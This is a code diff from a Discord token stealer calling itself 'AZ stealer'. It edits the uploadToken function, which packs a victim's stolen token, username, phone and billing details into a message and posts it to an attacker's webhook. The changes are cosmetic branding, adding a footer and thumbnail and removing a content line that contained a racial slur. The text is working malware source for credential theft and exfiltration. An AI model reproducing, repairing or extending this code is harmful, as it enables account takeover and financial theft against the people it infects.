@@ -230,7 +230,7 @@ def uploadToken(token,path):
         badge,phone,billing=badge,phone,None
     if nitro=='' and badge=='':nitro=' -'
     data={
-        'content':f'nigga's pc was injection with az stealer | Found in `{path}`',
+        'content':f'Found in `{path}`',
         'embeds':[
 {
             'color':16711680,
@@ -273,11 +273,18 @@ def uploadToken(token,path):
             'author':{
                 'name':f"{username}#{hashtag} ({idd})",
                 'icon_url':f"{pfp}"
+},
+            'footer':{
+                'text':'@AZstealer',
+                'icon_url':'https://cdn.discordapp.com/attachments/1081681894816620614/1081682054099505212/AZ.jpg'
+},
+            'thumbnail':{
+                'url':f"{pfp}"
 }
 }
 ],
         'avatar_url':'https://cdn.discordapp.com/attachments/1081681894816620614/1081682054099505212/AZ.jpg',
-        'username':'@AZstealer',
+        'username':'AZstealer',
         'attachments':[]
 }
     LoadUrlib(hook,data=dumps(data).encode(),headers=headers)
